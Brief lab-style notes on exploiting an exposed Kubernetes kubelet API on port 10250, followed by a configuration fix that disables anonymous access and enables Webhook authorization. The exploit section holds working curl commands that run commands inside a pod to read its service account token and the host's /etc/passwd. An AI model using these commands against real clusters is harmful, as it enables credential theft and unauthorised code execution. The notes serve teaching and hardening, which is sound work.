
# get infos

curl -k https://$IP:10250/metrics
curl -k https://$IP:10250/logs/
curl -k https://$IP:10250/logs/pods/    <!-- last slash is important -->
curl some pod

# get sensitive data

<!-- curl -XPOST -k https://$IP:10250/run/<namespace>/<pod>/<container> -d "cmd=<command-to-run>" -->

curl -XPOST -k https://$IP:10250/run/default/my-suboptimal-pod/my-ubuntu -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

curl -XPOST -k https://$IP:10250/run/default/my-suboptimal-pod/my-ubuntu -d "cmd=cat /host/etc/passwd"

# fix it

vi /var/lib/kubelet/config.yaml
=> enabled: false
=> mode: Webhook
<!-- systemctl daemon-reload -->
systemctl restart kubelet
<!-- systemctl status kubelet -->

... run curls again
